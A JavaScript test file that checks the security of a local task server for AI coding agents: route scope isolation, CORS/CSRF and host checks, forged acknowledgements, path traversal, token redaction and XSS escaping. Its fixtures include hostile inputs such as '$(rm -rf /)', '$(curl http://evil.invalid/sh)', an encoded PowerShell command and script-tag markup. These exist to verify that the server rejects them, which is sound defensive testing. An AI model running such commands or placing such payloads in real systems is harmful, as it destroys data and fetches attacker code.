"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const http = require("node:http");
const crypto = require("node:crypto");
const vm = require("node:vm");
const { Desk } = require("../desk.js");

function callHttp(port, { method = "GET", path: reqPath = "/", headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      host: "127.0.0.1",
      port,
      method,
      path: reqPath,
      headers: { host: `127.0.0.1:${port}`, ...headers },
    }, (res) => {
      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        const text = Buffer.concat(chunks).toString("utf8");
        let json = null;
        try { json = JSON.parse(text); } catch { /* ignore */ }
        resolve({ status: res.statusCode, headers: res.headers, text, json });
      });
    });
    req.on("error", reject);
    if (body !== undefined) req.write(typeof body === "string" ? body : JSON.stringify(body));
    req.end();
  });
}

test("CP4 Security: route-level scope isolation strips keys, pairing codes, and internal PC paths for lan_phone while enforcing admin route gates", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "ad-cp4-sec-"));
  const inbox = path.join(root, "secret-pc-inbox");
  const repoDir = path.join(root, "secret-pc-repo");
  const skillDir = path.join(root, "secret-pc-skills");
  const mailDir = path.join(root, "secret-pc-mail");
  for (const d of [inbox, repoDir, skillDir, mailDir]) fs.mkdirSync(d, { recursive: true });
  fs.mkdirSync(path.join(repoDir, ".git"), { recursive: true });
  fs.writeFileSync(path.join(skillDir, "guide.md"), "# Safe skill guide\nReference text only.\n");
  fs.writeFileSync(path.join(mailDir, "note.md"), "Shared note");

  const desk = new Desk({
    dataDir: path.join(root, "data"),
    legacyDir: null,
    port: 0,
    lan: false,
    graceMs: 0,
    discovery: false,
    pollMs: 600000,
    log: () => {},
  });
  desk.config.watch = [{ path: inbox, project: "SecProj" }];
  desk.config.task_repo_roots = [repoDir];
  desk.config.task_skill_roots = [skillDir];
  desk.config.mail_roots = [{ project: "SecProj", path: mailDir }];
  desk.config.file_sync_enabled = true;
  desk.mail.scan();
  desk.warnings.push({ time: new Date().toISOString(), level: "info", text: `Imported from ${inbox}` });
  desk.peers.requests.set("peer-req-1", { id: "peer-req-1", name: "Laptop", ip: "192.168.1.50", base: "http://192.168.1.50:8098", key: "a".repeat(32), code: "654321", time: Date.now() });

  const task = desk.tasks.assign({
    project: "SecProj",
    title: "Проверить изоляцию маршрутов",
    agent: "Carbon",
    device_id: desk.config.device_id,
    session_id: "sec-sess-1",
    role: "executor",
    prompt: "Проверить scope и скрытие путей.",
    checkpoint: {
      repo: repoDir,
      branch: "main",
      skills: [{ name: "guide", path: path.join(skillDir, "guide.md") }],
    },
  });

  await desk.start();
  const port = desk.boundPort;

  try {
    // 1. Loopback owner gets loopback_owner scope and approved root flags, NEVER raw keys in /api/state
    const ownerRes = await callHttp(port, { path: "/api/state" });
    assert.equal(ownerRes.status, 200);
    assert.equal(ownerRes.json.scope, "loopback_owner");
    assert.equal(ownerRes.json.verified_capabilities.local_owner, true);
    assert.equal(ownerRes.json.verified_capabilities.repo_roots_approved, true);
    assert.ok(!ownerRes.text.includes(desk.config.key), "Phone key must never appear in /api/state");
    assert.ok(!ownerRes.text.includes(desk.config.agent_key), "Agent API key must never appear in /api/state");

    // 2. Simulated lan_phone client (Capacitor WebView cross-origin with valid X-Agent-Desk-Key => auth.ok=true, auth.local=false)
    const phoneHeaders = {
      origin: "capacitor://localhost",
      "x-agent-desk-key": desk.config.key,
    };
    const phoneState = await callHttp(port, { path: "/api/state", headers: phoneHeaders });
    assert.equal(phoneState.status, 200);
    assert.equal(phoneState.json.scope, "lan_phone");
    assert.equal(phoneState.json.verified_capabilities.local_owner, false);
    assert.equal(phoneState.json.verified_capabilities.repo_roots_approved, false);

    // Zero keys, zero 6-digit pairing codes, zero internal PC paths in lan_phone responses!
    for (const secretOrPath of [desk.config.key, desk.config.agent_key, "654321", inbox, repoDir, skillDir, mailDir]) {
      assert.ok(!phoneState.text.includes(secretOrPath), `lan_phone /api/state leaked: ${secretOrPath}`);
    }

    const phoneCompact = await callHttp(port, { path: "/api/state?compact=1", headers: phoneHeaders });
    const phoneMail = await callHttp(port, { path: "/api/mail", headers: phoneHeaders });
    const phoneItem = await callHttp(port, { path: `/api/item?task=${task.task_id}`, headers: phoneHeaders });
    const phoneCtx = await callHttp(port, { path: `/api/tasks/context?id=${task.task_id}`, headers: phoneHeaders });
    const phoneDiag = await callHttp(port, { path: "/api/diagnostics", headers: phoneHeaders });
    for (const [label, res] of [["compact", phoneCompact], ["mail", phoneMail], ["item", phoneItem], ["context", phoneCtx], ["diag", phoneDiag]]) {
      assert.equal(res.status, 200, label);
      for (const secretOrPath of [desk.config.key, desk.config.agent_key, inbox, repoDir, skillDir, mailDir]) {
        assert.ok(!res.text.includes(secretOrPath), `lan_phone ${label} leaked: ${secretOrPath}`);
      }
    }

    // 3. Route-level 403 enforcement on PC-only admin endpoints for lan_phone
    for (const getAdminRoute of ["/api/pairing", "/api/reconcile"]) {
      const r = await callHttp(port, { path: getAdminRoute, headers: phoneHeaders });
      assert.equal(r.status, 403, `Expected 403 on ${getAdminRoute} for lan_phone`);
    }
    const phonePostHeaders = { ...phoneHeaders, "content-type": "application/json", "x-agent-desk": "1" };
    for (const [route, payload] of [
      ["/api/pairing/rotate", {}],
      ["/api/rejected/clear", {}],
      ["/api/mail/config", { automatic: true }],
      ["/api/config", { autostart: true }],
      ["/api/config", { lan: true }],
      ["/api/config", { watch: [] }],
      ["/api/config", { task_repo_roots: [repoDir] }],
      ["/api/peers/accept", { id: "peer-req-1" }],
      ["/api/agent/inbox", {}],
    ]) {
      const r = await callHttp(port, { method: "POST", path: route, headers: phonePostHeaders, body: payload });
      assert.equal(r.status, 403, `Expected 403 on POST ${route} for lan_phone`);
    }
  } finally {
    await desk.stop();
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test("CP4 Security negatives: Host/Origin/CORS/CSRF, forged ACK & project_id, path traversal/secrets, XSS markup, malicious checkpoint/skills, and fresh session non-inheritance", async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "ad-cp4-neg-"));
  const repoDir = path.join(root, "repo");
  const skillDir = path.join(root, "skills");
  fs.mkdirSync(repoDir, { recursive: true });
  fs.mkdirSync(skillDir, { recursive: true });
  const evilSkillFile = path.join(skillDir, "inject.md");
  fs.writeFileSync(evilSkillFile, "$(rm -rf /)\nAuthorization: Bearer secret_live_token_1234567890\n<script>alert('xss')</script>\n");

  const desk = new Desk({
    dataDir: path.join(root, "data"),
    legacyDir: null,
    port: 0,
    lan: false,
    graceMs: 0,
    discovery: false,
    pollMs: 600000,
    log: () => {},
  });
  desk.config.task_repo_roots = [repoDir];
  desk.config.task_skill_roots = [skillDir];

  // Malicious shell substitution in checkpoint.next_step is rejected outright
  assert.throws(() => desk.tasks.assign({
    project: "NegProj",
    title: "Shell injection attempt",
    agent: "Carbon",
    device_id: desk.config.device_id,
    session_id: "sess-inj",
    checkpoint: { next_step: "$(curl http://evil.invalid/sh)" },
  }), /descriptive metadata, not an executable command/);

  const xssTask = desk.tasks.assign({
    project: "NegProj",
    title: '<img src=x onerror="alert(1)"><script>evil()</script>',
    agent: "Carbon",
    device_id: desk.config.device_id,
    session_id: "sess-old",
    role: "executor",
    prompt: "Safe prompt",
    checkpoint: {
      next_step: "Проверить отчёт и артефакты",
      skills: [{ name: "inject", path: "inject.md" }],
    },
  });

  await desk.start();
  const port = desk.boundPort;
  const agentHeaders = {
    "x-agent-desk-agent-key": desk.config.agent_key,
    "content-type": "application/json",
    "x-agent-desk": "1",
  };

  try {
    // 1. Host rebinding, foreign Origin, CORS preflight, missing CSRF header
    const badHost = await callHttp(port, { path: "/api/state", headers: { host: `evil.example:${port}` } });
    assert.equal(badHost.status, 403);

    const badCors = await callHttp(port, { method: "OPTIONS", path: "/api/state", headers: { origin: "https://evil.example" } });
    assert.equal(badCors.status, 403);

    const foreignOriginWrite = await callHttp(port, {
      method: "POST",
      path: "/api/config",
      headers: { origin: "https://evil.example", "content-type": "application/json", "x-agent-desk": "1" },
      body: { notify: false },
    });
    assert.equal(foreignOriginWrite.status, 403);

    const noCsrfHeader = await callHttp(port, {
      method: "POST",
      path: "/api/config",
      headers: { "content-type": "application/json" },
      body: { notify: false },
    });
    assert.equal(noCsrfHeader.status, 403);

    const wrongContentType = await callHttp(port, {
      method: "POST",
      path: "/api/config",
      headers: { "content-type": "text/plain", "x-agent-desk": "1" },
      body: '{"notify":false}',
    });
    assert.equal(wrongContentType.status, 415);

    // 2. Agent API rejects cross-origin even on loopback with valid agent_key
    const crossSiteAgent = await callHttp(port, {
      path: "/api/agent/inbox",
      headers: { "x-agent-desk-agent-key": desk.config.agent_key, origin: "http://evil.example" },
    });
    assert.equal(crossSiteAgent.status, 403);

    // 3. Forged ACK (wrong agent, wrong session, wrong project_id)
    const msgId = xssTask.assignment_message_id;
    const forgedAgentAck = await callHttp(port, {
      method: "POST",
      path: "/api/agent/ack",
      headers: agentHeaders,
      body: { project: "NegProj", agent: "Impostor", session_id: "sess-old", message_id: msgId },
    });
    assert.equal(forgedAgentAck.status, 403);

    const forgedSessionAck = await callHttp(port, {
      method: "POST",
      path: "/api/agent/ack",
      headers: agentHeaders,
      body: { project: "NegProj", agent: "Carbon", session_id: "forged-session", message_id: msgId },
    });
    assert.equal(forgedSessionAck.status, 409);

    const forgedProjectSubmit = await callHttp(port, {
      method: "POST",
      path: "/api/agent/submit",
      headers: agentHeaders,
      body: {
        project: "NegProj",
        project_id: crypto.randomUUID(),
        agent: "Carbon",
        session_id: "sess-old",
        device_id: desk.config.device_id,
        task_id: xssTask.task_id,
        assignment_epoch: 1,
        state: "working",
        execution_state: "working",
      },
    });
    assert.equal(forgedProjectSubmit.status, 403);
    assert.equal(desk.state.todos[0].acked_at, null);

    // 4. Path validation & command/secret rejection in checkpoint/artifacts
    assert.throws(() => desk.tasks.assign({
      project: "NegProj", title: "Bad artifact", agent: "Carbon", device_id: desk.config.device_id, session_id: "s2",
      artifacts: [{ path: "../outside.txt" }],
    }), /safe relative/);
    assert.throws(() => desk.tasks.assign({
      project: "NegProj", title: "Secret artifact", agent: "Carbon", device_id: desk.config.device_id, session_id: "s2",
      artifacts: [{ path: ".env.production" }],
    }), /safe relative/);
    assert.throws(() => desk.tasks.assign({
      project: "NegProj", title: "Command injection field", agent: "Carbon", device_id: desk.config.device_id, session_id: "s2",
      checkpoint: { command: "powershell -enc ..." },
    }), /unsupported fields/);

    // 5. Skill bearer token is redacted in context() and shell syntax stays inert text
    const ctxOut = desk.tasks.context(xssTask.task_id);
    assert.ok(!ctxOut.text.includes("secret_live_token_1234567890"), "Bearer token in skill file must be redacted");
    assert.equal(ctxOut.checks.skills[0].status, "redacted");

    // 6. Fresh session non-inheritance: old session works & ACKs -> handoff to sess-new -> sess-new starts clean!
    const validAck = await callHttp(port, {
      method: "POST",
      path: "/api/agent/submit",
      headers: agentHeaders,
      body: {
        project: "NegProj",
        project_id: xssTask.project_id,
        agent: "Carbon",
        session_id: "sess-old",
        device_id: desk.config.device_id,
        task_id: xssTask.task_id,
        assignment_epoch: 1,
        seq: 1,
        state: "working",
        execution_state: "working",
        ack: [msgId],
      },
    });
    assert.equal(validAck.status, 200);
    assert.equal(desk.tasks.get(xssTask.task_id).state, "working");

    const handed = desk.tasks.handoff({
      task_id: xssTask.task_id,
      project: "NegProj",
      project_id: xssTask.project_id,
      assignment_epoch: 1,
      agent: "Carbon",
      device_id: desk.config.device_id,
      session_id: "sess-new",
      role: "executor",
    });
    assert.equal(handed.state, "assigned");
    assert.equal(handed.assignment.session_id, "sess-new");
    assert.equal(handed.assignment.epoch, 2);
    const enrichedHanded = desk.tasks.enrich(handed);
    assert.equal(enrichedHanded.lifecycle_signs.recipient_acked, false, "Fresh session must not inherit old session ACK");
    assert.equal(enrichedHanded.lifecycle_signs.executing, false, "Fresh session must not inherit old session working state");

    // Verify UI escapes XSS title and does not bind old session's agent row to sess-new
    const appJs = fs.readFileSync(path.join(__dirname, "..", "..", "web", "app.js"), "utf8").split("// --- desktop app window")[0];
    class SimpleNode {
      constructor() { this.nodes = new Map(); this.classList = { toggle() {}, add() {}, remove() {}, contains: () => false }; this.innerHTML = ""; this.textContent = ""; }
      querySelector(s) { if (!this.nodes.has(s)) this.nodes.set(s, new SimpleNode()); return this.nodes.get(s); }
      addEventListener() {}
    }
    const rootNode = new SimpleNode();
    const vmCtx = vm.createContext({
      console, Date, Object, Map, Set, String, Number, JSON, Array, Promise,
      crypto: crypto.webcrypto, window: { addEventListener() {} }, encodeURIComponent,
      location: { hostname: "localhost" }, localStorage: { getItem: () => null, setItem() {} },
      document: { createElement: () => new SimpleNode(), querySelector: (s) => rootNode.querySelector(s), querySelectorAll: () => [], addEventListener() {} },
      Node: { ELEMENT_NODE: 1, TEXT_NODE: 3 }, navigator: {}, AD_HOST: { kind: "web" },
      __payload: desk.payload({ local: true }),
    });
    vm.runInContext(`${appJs}\ndata = __payload; project = "*"; online = true; patch = (n, h) => { n.innerHTML = h; }; renderTasks();`, vmCtx);
    const renderedHtml = rootNode.querySelector("#task-list").innerHTML;
    assert.doesNotMatch(renderedHtml, /<script>|<img src=x/i, "XSS markup must be HTML-escaped");
    assert.equal(vm.runInContext("boundAgentForTask(data.tasks[0])", vmCtx), null, "UI must not bind sess-old agent status onto sess-new task");
  } finally {
    await desk.stop();
    fs.rmSync(root, { recursive: true, force: true });
  }
});
